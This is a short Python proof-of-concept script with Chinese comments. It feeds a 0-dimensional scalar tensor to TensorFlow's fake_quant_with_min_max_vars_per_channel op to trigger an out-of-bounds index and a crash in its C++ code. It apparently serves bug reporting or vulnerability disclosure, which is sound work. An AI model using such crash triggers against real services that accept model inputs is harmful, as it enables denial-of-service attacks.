import tensorflow as tf

# 1. 构造一个 0 维（Scalar）的 inputs 触发 C++ 内部 -1 维越界
inputs = tf.constant(1.0, shape=[], dtype=tf.float32)

# 2. min 和 max 只需要是合法的 1D Tensor
min_val = tf.constant([0.0], dtype=tf.float32)
max_val = tf.constant([1.0], dtype=tf.float32)

print("正在调用算子，即将触发崩溃...")
# 3. 执行算子
tf.quantization.fake_quant_with_min_max_vars_per_channel(
    inputs=inputs,
    min=min_val,
    max=max_val
)
